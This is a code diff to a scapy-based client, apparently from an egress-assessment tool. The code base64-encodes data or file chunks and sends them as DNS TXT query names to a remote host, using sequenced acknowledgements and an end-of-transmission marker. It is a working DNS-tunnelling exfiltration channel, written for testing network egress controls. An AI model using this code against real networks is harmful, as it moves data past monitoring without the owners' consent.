@@ -54,7 +54,19 @@ class Client:
         # While loop over the file or data to send
         while (byte_reader < len(data_to_transmit)):
             if not self.file_transfer:
-                encoded_data = base64.b64encode(data_to_transmit[byte_reader:byte_reader + self.length])
+                try:
+                    encoded_data = base64.b64encode(data_to_transmit[byte_reader:byte_reader + self.length])
+                    send(IP(dst=final_destination)/UDP()/DNS(
+                           id=15, opcode=0, qd=[DNSQR(
+                            qname=encoded_data, qtype="TXT")], aa=1, qr=0),
+                         verbose=False)
+                    print "Sending data...        " + str(packet_number) + "/" + str(total_packets)
+                    packet_number += 1
+                    byte_reader += self.length
+
+                except KeyboardInterrupt:
+                    print "[*] Shutting down..."
+                    sys.exit()
             else:
                 encoded_data = base64.b64encode(str(packet_number) + ".:|:." + data_to_transmit[byte_reader:byte_reader + self.length])
 
@@ -73,38 +85,39 @@ class Client:
                     self.current_total = packet_number + packet_diff
                     check_total = False
 
-            print "[*] Packet Number/Total Packets:        " + str(packet_number) + "/" + str(self.current_total)
+                print "[*] Packet Number/Total Packets:        " + str(packet_number) + "/" + str(self.current_total)
 
-            # Craft the packet with scapy
-            try:
-                while True:
+                # Craft the packet with scapy
+                try:
+                    while True:
 
-                    response_packet = sr1(IP(dst=final_destination)/UDP()/DNS(
-                        id=15, opcode=0,
-                        qd=[DNSQR(qname=encoded_data, qtype="TXT")], aa=1, qr=0),
-                        verbose=False, timeout=2)
+                        response_packet = sr1(IP(dst=final_destination)/UDP()/DNS(
+                            id=15, opcode=0,
+                            qd=[DNSQR(qname=encoded_data, qtype="TXT")], aa=1, qr=0),
+                            verbose=False, timeout=2)
 
-                    if response_packet:
-                        if response_packet.haslayer(DNSRR):
-                            dnsrr_strings = repr(response_packet[DNSRR])
-                            if str(packet_number) + "allgoodhere" in dnsrr_strings:
-                                break
+                        if response_packet:
+                            if response_packet.haslayer(DNSRR):
+                                dnsrr_strings = repr(response_packet[DNSRR])
+                                if str(packet_number) + "allgoodhere" in dnsrr_strings:
+                                    break
 
-            except KeyboardInterrupt:
-                print "[*] Shutting down..."
-                sys.exit()
+                except KeyboardInterrupt:
+                    print "[*] Shutting down..."
+                    sys.exit()
 
             # Increment counters
             byte_reader += self.length
             packet_number += 1
 
-        while True:
-            final_packet = sr1(IP(dst=final_destination)/UDP()/DNS(
-                id=15, opcode=0,
-                qd=[DNSQR(qname="ENDTHISFILETRANSMISSIONEGRESSASSESS" + self.file_transfer, qtype="TXT")], aa=1, qr=0),
-                verbose=True, timeout=2)
+        if self.file_transfer is not False:
+            while True:
+                final_packet = sr1(IP(dst=final_destination)/UDP()/DNS(
+                    id=15, opcode=0,
+                    qd=[DNSQR(qname="ENDTHISFILETRANSMISSIONEGRESSASSESS" + self.file_transfer, qtype="TXT")], aa=1, qr=0),
+                    verbose=True, timeout=2)
 
-            if final_packet:
-                break
+                if final_packet:
+                    break
 
         return
